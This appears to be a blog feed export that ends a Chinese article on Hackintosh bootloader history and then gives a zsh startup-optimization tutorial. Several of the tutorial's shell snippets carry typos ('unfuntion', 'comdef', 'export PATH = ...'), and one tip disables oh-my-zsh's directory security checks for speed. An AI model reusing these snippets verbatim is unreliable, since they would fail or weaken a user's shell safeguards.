IO80211Family。</p></blockquote>\n<p>同年，来自 tonymacx86 的 MacMan 开发了 <a href=\"https://tonymacx86.blogspot.com/2011/04/chimera-unified-chameleon-bootloader.html\">变色龙的一个分支 Chimera</a>。tonymacx86 社区提供的工具 UniBeast（以及后来的 MultiBeast）内置了 Chimera、大大简化了黑苹果的安装。</p>\n<h2>来到 Clover（四叶草）的时代</h2>\n<p>不论是 David Elliott 的 Boot-dfe 还是变色龙，都是基于一个模拟的 EFI 环境。这意味着：</p>\n<ul>\n<li>黑苹果不能安装 BootCamp 实现 Windows 和 Mac OS X 之间切换</li>\n<li>黑苹果无法进入恢复模式，因为变色龙无法引导 Recovery HD 分区</li>\n<li>黑苹果的硬盘不能使用 GUID 分区表（GPT），因为变色龙不支持 GPT、只支持 MBR</li>\n</ul>\n<p>微软从 Windows 7 开始对 UEFI 引导提供初步支持、主流 PC 和笔记本厂商都逐渐用 EFI 代替 Legacy BIOS；同时随着大于 2TiB 的硬盘的出现，GPT 越来越流行，Hackintosher 对支持 GPT 的、真正的 UEFI Bootloader 的呼声越来越高。</p>\n<p>Clover 的历史可以回溯到 2006 年出现的一个 FreeBSD 发行版 TrueOS。TrueOS 社区的 Christoph Pfisterer 开发了一个带有图形化界面的 UEFI Bootloader「rEFIt」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/7.png\" width=\"803\" height=\"378\" class=\"lazy post-img\"></p>\n<p>2011 年 Christoph Pfisterer 中止了 rEFIt 的开发。次年，开发者 Roderick W. Smith Fork 了 rEFIt、成立了 rEFInd 项目。同年，Slice 和 OSx86 社区讨论开发一个 UEFI Bootloader：除了支持和变色龙一样模拟 EFI 环境外、还需要兼容真正的 UEFI 环境；要能正确读取 HFS+ 分区；式、能够修补 ACPI、加载 kext、加载 SMBIOS、内置 Quirk 以在 PC 上启动 macOS。社区决定这个 Bootloader 应该基于 rEFInd 开发。2012 年，OS X 10.8 Mountain Lion 正式发布，同年 Clover 发布了第一个版本：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/8.png\" width=\"622\" height=\"533\" class=\"lazy post-img\"></p>\n<p>2014 年 10 月 16 日 OS X 10.10 Yosemite 发布，次日 Voodoo 团队发布了变色龙最后一个正式版本 2.2，提供了 Yosemite 的引导支持。</p>\n<blockquote><p>正是从 OS X 10.10 Yosemite 开始，Hackintosher 开始倾向于使用苹果发布的原始 OS X 系统镜像、使用尽可能少的 kext 和 Patch，以保证黑苹果的稳定性。</p></blockquote>\n<p>2015 年 9 月 30 日，OS X 10.11 El Capitan 发布，tonymacx86 出品的黑苹果安装工具 UniBeast 将内置的 Bootloader 从变色龙的分支 Chimera 替换为 Clover，正式宣告变色龙寿终正寝。</p>\n<h2>尾声：几个时间</h2>\n<p>截至本文写就，macOS 11.0 Big Sur 已经进入 Public Beta 5，苹果已经宣布未来 Mac 将会从 Intel 切换到 ARM 架构的 Apple Silicon。不少 Hackintosher 都在担心黑苹果的未来。本文就以对几个时间点的探讨作为结尾吧。</p>\n<h3>Clover 用了多久才取代了 Chameleon（变色龙）？</h3>\n<ul>\n<li>2008 年初 Chameleon 发布了首个版本</li>\n<li>2012 年 Clover 发布了首个版本</li>\n<li>2014 年 10 月 17 日 Chameleon 发布了最后一个版本</li>\n</ul>\n<p>Clover 从发布第一个版本发布到取代 Chameleon 只用了 2 年。</p>\n<h3>苹果从 PowerPC 切换到 Intel 用了多久？</h3>\n<ul>\n<li>2005 年 6 月 6 日苹果召开 WWDC 2005，宣布苹果将从 PowerPC 切换到 Intel</li>\n<li>2006 年 1 月 10 日苹果发布了第一台使用 Intel 的 MacBook Pro</li>\n<li>2009 年 8 月 28 日苹果发布了 Mac OS X 10.6 Snow Leopard，正式停止对 PowerPC 的支持。 </li>\n</ul>\n<p>也就是说，苹果从宣布切换到 Intel 到 Mac OS X 放弃 PowerPC 支持用了 4 年。</p>\n<h3>OpenCore 什么时候会取代 Clover？</h3>\n<p>OpenCore 0.0.1 发布于 2019 年 5 月 4 日。如果 Clover 只用了两年就完成了从发布到取代变色龙，那么明年 OpenCore 就会完全取代 Clover（指 Clover 终止开发）。然而抛开历史背景讲历史就是在耍流氓，前面的章节我们看到了变色龙的诸多缺陷（模拟的 UEFI、不支持 GPT 等），被 Clover 取代是必然的。但是现在 Clover 并没有明显的弊端、而 OpenCore 也没有非常显著的优势，加之 Clover 的维护仍然非常活跃，因此在可预见的未来中 Clover 和 OpenCore 仍然会同时存在。</p>\n<h3>苹果什么时候会放弃 Intel 的 x86 架构？</h3>\n<p>这可能是 Hackintosher 们最关心的问题了。如果套用苹果从 PowerPC 切换 Intel 的时间表，那么苹果会在 WWDC 开完后第二年（也就是 2021 年）就会将所有 Mac 切换为 ARM 架构（不再发布搭载 Intel 处理器的 Mac）、而 macOS 则会在三年后（也就是 2024 年）正式放弃对 Intel 处理器的支持。</p>\n<p>但是，现在苹果的策略和 15 年前的还是存在着重大区别 —— WWDC 2005 开完以后，苹果在 2005 年下半年没有再发布任何新 Mac，主要是释出现有的 PowerPC 架构的 Mac 的性能升级（增加运行内存、硬盘扩容等），接着整个 2006 年都没有发布 PowerPC 架构的 Mac、全部产品线都切换到 Intel 架构；而 WWDC 2020 之后，苹果却还是发布了搭载 10 代 Intel 处理器的 27 寸的 iMac 2020。显然，这一次苹果在更换架构这件事上要保守许多，苹果甚至可能在到 2021 年都会发布搭载 Intel 11 代处理器的 Mac。</p>\n<p>另外，我们还可以再列一张关于 macOS 的时间表：</p>\n<ul>\n<li>OS X 10.10 Yosemite 发布于 2014 年 10 月 16 日、兼容 2007 年及以后的 iMac 和 MacBook Pro，最后更新于 2015 年 8 月 15 日。</li>\n<li>OS X 10.11 El Caption 发布于 2015 年 9 月 30 日、兼容 2007 年及以后的 iMac 和 MacBook Pro，最后更新于 2018 年 7 月 9 日。</li>\n<li>macOS 10.12 Sierra 发布于 2016 年 9 月 20 日，兼容 2009 年下半年发布的 iMac 和 MacBook，最后更新于 2019 年 9 月 26 日。</li>\n<li>macOS 10.13 High Sierra 发布于 2017 年 9 月 25 日，兼容 2009 年下半年发布的 iMac 和 MacBook，最后更新于 2019 年 12 月 10 日。</li>\n<li>macOS 10.14 Mojave 发布于 2018 年 9 月 24 日，兼容 2010 年的 iMac Pro 和 2012 年下半年发布的所有 Mac，最后更新于 2019 年 12 月 10 日。</li>\n<li>macOS 10.15 Catalina 发布于 2019 年 10 月 7 日，兼容 2010 年的 iMac Pro 和 2012 年下半年发布的所有 Mac，截至本文写就仍在维护。</li>\n<li>macOS 11.0 Big Sur 于 2020 年 6 月 22 日开始内测，兼容 2013 年上半年发布的 MacBook Air，截至本文写就仍处于公测阶段。</li>\n</ul>\n<p>通过这张时间表可以发现，过去 6 年的每个 macOS 大版本都会兼容至少 7 年以前发布的设备。因此就算苹果从 2021 年开始再也不发布搭载 Intel 处理器的 Mac，macOS 可能也需要到 2025 年才会终止对 Intel 处理器的支持。</p>\n<div class=\"license\"> <div class=\"license-title\">黑苹果的历史</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/history-osx86/\">https://blog.skk.moe/post/history-osx86/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-09-02</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/history-osx86/"},{"title":"我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化","date":"2020-08-10 03:59:00","description":"\n<p>不论是在 WSL、Linux 还是 macOS 上，强大的 zsh 一直是我的不二法宝，而 oh my zsh 自然成了最趁手的瑞士军刀，我自己还编写了数个 oh my zsh 插件和主题。直到有一天我突然发现：见鬼，为什么开个 iTerm2 的 Tab 要等上好几秒钟？</p>\n<span></span><h2>zsh 启动耗时测量</h2>\n<p>首先，我们需要一个客观衡量 zsh 启动速度的标准，而使用 macOS 和众多 Linux 发行版中自带的 <code>time</code> 可以轻松计算任何命令的执行用时，包括 shell：</p>\n<pre><code class=\"hljs bash\">$ /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>        1.77 real         1.04 user         0.95 sys</code></pre>\n<p><code>time</code> 输出了 zsh 启动时 user-land 和 system 用时，而我的 zsh 启动用时将近 2 秒钟。为了获得更精确的结果，使用 for 循环连续启动 zsh 5 次：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        1.74 real         1.02 user         0.92 sys        1.69 real         1.00 user         0.90 sys        1.71 real         1.01 user         0.91 sys        1.68 real         0.99 user         0.89 sys        1.74 real         1.02 user         0.93 sys</code></pre>\n<p>为了排除 zsh 本身的性能问题，使用 zsh 的 <code>--no-rcs</code> 参数进行测试：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 20); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh --no-rcs -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys</code></pre>\n<p>不加载 <code>.zshrc</code> 时，zsh 的启动速度是如此的快，以至于 <code>time</code> 给出了 <code>0.00</code> 的结果。</p>\n<h2>Profiling</h2>\n<p>zsh 提供了专门的 profiling 模块 <code>zprof</code> 用于衡量 zsh 各个函数的执行用时。在 <code>.zshrc</code> 文件第一行添加下述命令用于加载 <code>zprof</code> 模块：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">zmodload</span> zsh/<span class=\"hljs-built_in\">zprof</span></code></pre>\n<p>接着启动 zsh、并使用 <code>zprof</code> 命令获取各函数用时数据：</p>\n<pre><code class=\"hljs bash\">$ /bin/zsh$ <span class=\"hljs-built_in\">zprof</span>num  calls                time                       self            name----------------------------------------------------------------------------------- 1)    1         395.66   395.66   33.10%    395.59   395.59   33.09%  _zsh_nvm_auto_use 2)    1         216.22   216.22   18.09%    216.13   216.13   18.08%  nvm_die_on_prefix 3)    1         648.00   648.00   54.20%    168.85   168.85   14.12%  nvm_auto 4)    2         479.15   239.57   40.08%    160.50    80.25   13.43%  nvm 5)    1         102.30   102.30    8.56%     84.99    84.99    7.11%  nvm_ensure_version_installed 6)    2          51.21    25.60    4.28%     29.55    14.78    2.47%  compinit 7)    1         680.18   680.18   56.89%     22.17    22.17    1.85%  _zsh_nvm_load 8)    2          21.66    10.83    1.81%     21.66    10.83    1.81%  compaudit 9)    1          17.31    17.31    1.45%     17.31    17.31    1.45%  nvm_is_version_installed10)  193          17.43     0.09    1.46%     14.50     0.08    1.21%  _zsh_autosuggest_bind_widget[Redacted]</code></pre>\n<p><code>zprof</code> 模块只能获取每个 zsh 函数的用时，因此适合找出拖累 zsh 冷启动的 oh my zsh 的插件。如果要获取完整的 <code>.zshrc</code> 性能分析，应该使用 <code>xtrace</code>。在 <code>.zshrc</code> 开头添加如下命令：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">zmodload</span> zsh/datetime<span class=\"hljs-built_in\">setopt</span> PROMPT_SUBSTPS4=<span class=\"hljs-string\">'+$EPOCHREALTIME %N:%i&gt; '</span>logfile=$(mktemp zsh_profile.7Pw1Ny0G)<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"Logging to <span class=\"hljs-variable\">$logfile</span>\"</span><span class=\"hljs-built_in\">exec</span> 3&gt;&amp;2 2&gt;<span class=\"hljs-variable\">$logfile</span><span class=\"hljs-built_in\">setopt</span> XTRACE</code></pre>\n<p>并在 <code>.zshrc</code> 结尾添加如下命令：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">unsetopt</span> XTRACE<span class=\"hljs-built_in\">exec</span> 2&gt;&amp;3 3&gt;&amp;-</code></pre>\n<p>这会在 <code>$HOME</code> 目录下生成一个文件名包含随机字符串的文件（<code>zsh_profile.123456</code> ）。一些介绍 zsh profiling 的文章会推荐使用 <a href=\"http://kcachegrind.sourceforge.net/html/Home.html\">kcachegrind</a> 这个工具可视化这个文件，但是我们只需要知道是什么拖累了 zsh 冷启动，将这个文件格式化一下即可。这里提供一个简单的脚本：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-meta\">#!/usr/bin/env zsh</span><span class=\"hljs-built_in\">typeset</span> -a lines<span class=\"hljs-built_in\">typeset</span> -i prev_time=0<span class=\"hljs-built_in\">typeset</span> prev_command<span class=\"hljs-keyword\">while</span> <span class=\"hljs-built_in\">read</span> line; <span class=\"hljs-keyword\">do</span>    <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$line</span> =~ <span class=\"hljs-string\">'^.*\\+([0-9]{10})\\.([0-9]{6})[0-9]* (.+)'</span> ]]; <span class=\"hljs-keyword\">then</span>        <span class=\"hljs-built_in\">integer</span> this_time=<span class=\"hljs-variable\">$match</span>[1]<span class=\"hljs-variable\">$match</span>[2]        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$prev_time</span> -gt 0 ]]; <span class=\"hljs-keyword\">then</span>            time_difference=$(( <span class=\"hljs-variable\">$this_time</span> - <span class=\"hljs-variable\">$prev_time</span> ))            lines+=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$time_difference</span> <span class=\"hljs-variable\">$prev_command</span>\"</span>        <span class=\"hljs-keyword\">fi</span>        prev_time=<span class=\"hljs-variable\">$this_time</span>        <span class=\"hljs-built_in\">local</span> this_command=<span class=\"hljs-variable\">$match</span>[3]        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">${#this_command}</span> -le 80 ]]; <span class=\"hljs-keyword\">then</span>            prev_command=<span class=\"hljs-variable\">$this_command</span>        <span class=\"hljs-keyword\">else</span>            prev_command=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${this_command:0:77}</span>...\"</span>        <span class=\"hljs-keyword\">fi</span>    <span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">done</span> &lt; <span class=\"hljs-variable\">${1:-/dev/stdin}</span><span class=\"hljs-built_in\">print</span> -l <span class=\"hljs-variable\">${(@On)lines}</span></code></pre>\n<p>将上述内容保存在 <code>$HOME</code> 目录下 <code>format_profile.zsh</code> 文件中，然后在终端中执行：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">cd</span> <span class=\"hljs-variable\">$HOME</span>$ chmod +x format_profile.zsh$ ./format_profile.zsh zsh_profile.123456 | head -n 30356910 _zsh_nvm_auto_use:14&gt; [[ none != N/A ]]307791 /Users/sukka/.zshrc:312&gt; hexo <span class=\"hljs-string\">'--completion=zsh'</span>178444 /Users/sukka/.zshrc:310&gt; thefuck --<span class=\"hljs-built_in\">alias</span>161193 nvm_version:21&gt; VERSION=N/A148555 nvm_version:21&gt; VERSION=N/A96497 (<span class=\"hljs-built_in\">eval</span>):4&gt; pyenv <span class=\"hljs-built_in\">rehash</span>58759 /Users/sukka/.zshrc:311&gt; pyenv init -48629 nvm_auto:15&gt; VERSION=<span class=\"hljs-string\">''</span>42779 /Users/sukka/.zshrc:114&gt; FPATH=/usr/<span class=\"hljs-built_in\">local</span>/share/zsh/site-functions:/usr/<span class=\"hljs-built_in\">local</span>...42527 nvm_auto:15&gt; nvm_resolve_local_alias default41620 nvm_resolve_local_alias:7&gt; VERSION=<span class=\"hljs-string\">''</span>35577 nvm_resolve_local_alias:7&gt; VERSION=<span class=\"hljs-string\">''</span>29444 _zsh_nvm_load:6&gt; <span class=\"hljs-built_in\">source</span> /Users/sukka/.nvm/nvm.sh24967 compaudit:154&gt; _i_wfiles=( )24889 nvm_resolve_alias:15&gt; ALIAS_TEMP=<span class=\"hljs-string\">''</span>22000 nvm_auto:18&gt; nvm_rc_version20890 nvm_ls:29&gt; PATTERN=default[Redacted]</code></pre>\n<p>这样就一目了然了。可以看到，除了 <code>nvm</code> 以外、<code>hexo</code> 的自动补全、<code>thefuck</code> 的初始化、<code>pyenv</code> 都大幅拖慢了 zsh 的启动速度。</p>\n<h2>Lazyload</h2>\n<p>你可能听过 <a href=\"https://blog.skk.moe/post/img-lazyload-hexo/\">网页的图片可以 lazyload</a>、<a href=\"https://blog.skk.moe/post/prevent-disqus-from-slowing-your-site/\">Disqus 评论系统可以 lazyload</a>，但是 <code>.zshrc</code> 一样也有 lazyload。lazyload 的特点是启动时快，首次使用时慢，因此很适合用于优化不常用而且初始化非常耗时的功能。</p>\n<p>lazyload 的方法是声明一个占位函数，当执行这个函数时完成对真实命令的初始化、并移除命令占位。以 pyenv 为例：</p>\n<pre><code class=\"hljs sh\"><span class=\"hljs-comment\"># 提前将 .pyenv/shims 添加到 PATH 中，这样即使 pyenv 没有初始化也可以使用 Python</span><span class=\"hljs-built_in\">export</span> PATH=<span class=\"hljs-string\">\"/Users/sukka/.pyenv/shims:<span class=\"hljs-variable\">${PATH}</span>\"</span><span class=\"hljs-function\"><span class=\"hljs-title\">pyenv</span></span>() {  <span class=\"hljs-comment\"># 移除占位函数</span>  unfuntion pyenv  <span class=\"hljs-comment\"># 初始化 pyenv</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>  <span class=\"hljs-comment\"># 继续执行 pyenv 命令</span>  pyenv <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$@</span>\"</span>}</code></pre>\n<p>pyenv 在初始化时会自动加载补全（completion），但是由于 lazyload、第一次执行 <code>pyenv</code> 时就没有补全了，因此还需要为补全添加 lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">__lazyload_completion_pyenv</span></span>() {  <span class=\"hljs-comment\"># 删除 pyenv 命令补全的占位</span>  comdef -d pyenv  <span class=\"hljs-comment\"># 移除 pyenv 占位函数</span>  <span class=\"hljs-built_in\">unfunction</span> pyenv  <span class=\"hljs-comment\"># 加载真正的 pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}compdef __lazyload_completion_pyenv pyenv</code></pre>\n<p>这样，当首次输入 <code>pyenv</code> 并按下 Tab 时会加载 pyenv 的命令补全，第二次按下 Tab 时就可以正常显示命令补全了。</p>\n<p>将上述 lazyload 封装成函数便于调用：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_command</span></span>() {    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$1</span>() { \\</span><span class=\"hljs-string\">        unfunction <span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        _sukka_lazyload__command_<span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        <span class=\"hljs-variable\">$1</span> \\$@ \\</span><span class=\"hljs-string\">    }\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_completion</span></span>() {    <span class=\"hljs-built_in\">local</span> comp_name=<span class=\"hljs-string\">\"_sukka_lazyload__compfunc_<span class=\"hljs-variable\">$1</span>\"</span>    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${comp_name}</span>() { \\</span><span class=\"hljs-string\">        compdef -d <span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">        _sukka_lazyload_completion_<span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">    }\"</span>    compdef <span class=\"hljs-variable\">$comp_name</span> <span class=\"hljs-variable\">$1</span>}</code></pre>\n<p>使用封装好的 lazyload 函数添加 <code>pyenv</code> 和 <code>thefuck</code> 的 lazyload、Hexo completion 的 lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 初始化</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__compfunc_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}<span class=\"hljs-comment\"># 添加 pyenv 的 lazyload</span>sukka_lazyload_add_command pyenvsukka_lazyload_add_completion pyenv<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_fuck</span></span>() {  <span class=\"hljs-comment\"># fuck 初始化</span>  <span class=\"hljs-built_in\">eval</span> $(thefuck --<span class=\"hljs-built_in\">alias</span>)}<span class=\"hljs-comment\"># 添加 fuck 的 lazyload</span>sukka_lazyload_add_command fuck<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__completion_hexo</span></span>() {  <span class=\"hljs-comment\"># hexo 的 completion</span>  <span class=\"hljs-built_in\">eval</span> $(hexo --completion=zsh)}<span class=\"hljs-comment\"># 添加 hexo completion 的 lazyload</span>sukka_lazyload_add_completion hexo</code></pre>\n<h2>替换 NVM</h2>\n<p>我使用 nvm 的方式是 <code>zsh-nvm</code> 插件。由于我的开发环境也高度依赖 <code>.nvmrc</code> 文件，所以不得不启用 nvm auto use。由于我的许多工具高度依赖 Node.js（如我的 <a href=\"https://nali.skk.moe/\">Nali CLI</a>），lazyload nvm 也是不现实的。我不得不寻找另一个代替 nvm 的 Node.js 版本管理器，最后我选中了 <a href=\"https://github.com/tj/n\"><code>tj/n</code></a>。</p>\n<p>首先是卸载 nvm、nvm 安装的所有 Node.js 版本、以及 zsh-nvm 插件：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 卸载 nvm 及其安装的 Node.js</span>$ rm -rf <span class=\"hljs-variable\">$HOME</span>/.nvm<span class=\"hljs-comment\"># 删除 zsh-nvm 插件</span>$ rm -rf <span class=\"hljs-variable\">$ZSH</span>/custom/plugins/zsh-nvm<span class=\"hljs-comment\"># 除了删除目录，还需要在 .zshrc 中的 plugins 数组中删除 zsh-nvm</span></code></pre>\n<p>接着安装 <code>tj/n</code> 作为 Node.js 版本管理器，macOS 上可以通过 Homebrew 直接安装：</p>\n<pre><code class=\"hljs bash\">$ brew install n</code></pre>\n<p>在 <code>.zshrc</code> 中配置 <code>tj/n</code>：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># tj/n 的路径</span><span class=\"hljs-built_in\">export</span> N_PREFIX=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$HOME</span>/.n\"</span><span class=\"hljs-comment\"># 当切换 Node.js 版本时保留 npm</span><span class=\"hljs-built_in\">export</span> N_PRESERVE_NPM=1<span class=\"hljs-comment\"># 将 tj/n 添加到 PATH</span><span class=\"hljs-built_in\">export</span> PATH = <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$N_PREFIX</span>/bin:<span class=\"hljs-variable\">$PATH</span>\"</span></code></pre>\n<h2>使用 zsh 内置语法</h2>\n<p>zsh 强大之处不仅在于内建的插件、优雅的使用方式，更重要的是极其强大的语法。在 <code>.zshrc</code> 广泛使用 zsh 内置的语法可以大幅提高执行性能。</p>\n<h3>zsh 判断命令是否存在</h3>\n<p>我们经常需要在 <code>.zshrc</code> 之中编写命令是否存在的条件语句，比如「仅当命令存在时加载该命令的自动补全」，或者「当 Node.js 存在时输出 Node.js 版本」。通常情况下我们会写出以下三种条件判断方式：</p>\n<pre><code class=\"hljs bash\">[[ <span class=\"hljs-built_in\">command</span> -v node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">which</span> -a node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">type</span> node &amp;&gt;/dev/null ]] &amp;&amp; node -v</code></pre>\n<p>但是在 zsh 中，还有一种速度更快的判断命令存在的方法：</p>\n<pre><code class=\"hljs bash\">(( $+commands[node] )) &amp;&amp; node -v</code></pre>\n<p>zsh 提供了一个数组元素查找语法 <code>$+array[item]</code> （元素存在则返回 1 否则返回 0），同时 zsh 也维护了一个命令数组 <code>$commands</code>，在数组中检索元素比调用 <code>which</code>、<code>type</code>、<code>command -v</code> 命令都要快许多。</p>\n<h3>变量字符串查找</h3>\n<p>在 <code>.zshrc</code> 中鲜少需要用到这样的语法，不过依然存在一些 case，比如为了避免向 <code>$FPATH</code> 中重复添加 Homebrew 的自动补全，提前检查 <code>$FPATH</code> 中是否已经包含了 Homebrew 的路径。一般常见的写法都涉及到 <code>echo</code> 和 <code>grep</code> ：</p>\n<pre><code class=\"hljs bash\">[[ $(<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$FPATH</span> | grep <span class=\"hljs-string\">\"/usr/local/share/zsh/site-functions\"</span>) ]] &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>但是在 zsh 中我们不需要 <code>grep</code> 也可以实现同样的功能：</p>\n<pre><code class=\"hljs bash\">(( <span class=\"hljs-variable\">$FPATH</span>[(I)/usr/<span class=\"hljs-built_in\">local</span>/share/zsh/site-functions] )) &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>zsh 内置了在变量中匹配字符串的语法：<code>$variable[(i)keyword]</code> 和 <code>$variable[(I)keyword]</code>，前者是从左往右寻找、后者是从右往左寻找，返回值为第一个匹配的首字符位置，当没有匹配时返回值则是变量的最终位置，也就是说当找不到匹配时 <code>(i)</code> 会返回字符串的长度、而 <code>(I)</code> 会返回 0。因此只需要从右往左寻找、判断返回值是否为 0 即可，搭配将数字转化为布尔值的 <code>(( ))</code> 就可以写出又快又漂亮的条件语句。</p>\n<h3>变量字符串替换</h3>\n<p>当需要截断或者替换字符串时，大部分人第一时间会想到 <code>sed</code> ，因当此需要替换变量中的字符时自然而然的会使用 <code>echo | sed</code>。比如，在 macOS 中主机名 <code>$HOST</code> 变量通常以 <code>.local</code> 结尾：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span>Sukka-MBP.local</code></pre>\n<p>如果要显示 <code>Sukka-MBP</code> （在 prompt 中常常会用到）就需要写成：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span> | sed -e <span class=\"hljs-string\">\"s/.local//\"</span>Sukka-MBP</code></pre>\n<p>但是，强大的 zsh 内置了简单的变量字符串替换语法，使用下述命令可以达到相同的效果：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/}</span>Sukka-MBP$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/.foxtail}</span>Sukka-MBP.foxtail</code></pre>\n<h2>其它优化手段</h2>\n<h3>禁用多余的插件</h3>\n<p>oh my zsh 在 Wiki 里说「Add wisely, as too many plugins slow down shell startup」。通过 profiling 可以发现一些插件（如 <code>git</code> 插件）执行耗时也不短。考虑到 oh my zsh 内置的 <code>git</code> 插件只是一些 alias、大部分我都用不到，因此将其从 <code>plugins</code> 数组中移除。</p>\n<h3>避免产生子进程</h3>\n<p>在 shell 中有不少语法会产生子进程。由于这些不受控制的子进程可能会产生其它子进程、从而导致潜在的巨大开销。常见的会产生子进程的语法有是 <code>eval</code> 和 Command substitution，在编写 <code>.zshrc</code> 时应该尽量避免使用它们。</p>\n<p>例如，Homebrew 是通过 Ruby —— 一种没有性能优势的语言编写的，而且 Homebrew 的开发者甚至因为不会翻转二叉树而错失了 Google 的 offer（想必大家大体可以猜得出 Homebrew 中的负优化），因此在 zsh 启动时产生一个子进程运行 Homebrew 将是不能忍受的，绝大部分使用 Homebrew 的人都不会改变 Homebrew 的路径，因此与其在 <code>.zshrc</code> 中使用 <code>$(brew --prefix)</code>，不如直接将命令执行的结果（<code>/usr/local</code>）直接写在 <code>.zshrc</code> 中。</p>\n<h3>启用 ZSH_DISABLE_COMPFIX</h3>\n<p>oh my zsh 内置了安全功能、避免 oh my zsh 插件使用不安全的目录和文件，但是这意味着插件在加载时需要通过一系列 security checker。通过禁用安全功能 （<code>export ZSH_DISABLE_COMPFIX=\"true\"</code>）可以使 zsh 启动速度加快 0.06s。微不足道，但值得一试。</p>\n<h2>针对 macOS 的优化</h2>\n<h3>path_helper</h3>\n<p>和 Linux 不同，在 macOS 上 zsh 启动序列的第一项为 <code>/etc/zprofile</code> 而不是 <code>~/.zprofile</code>。macOS 通过 <code>/etc/zprofile</code> 来调用 <code>path_helper</code>：</p>\n<pre><code 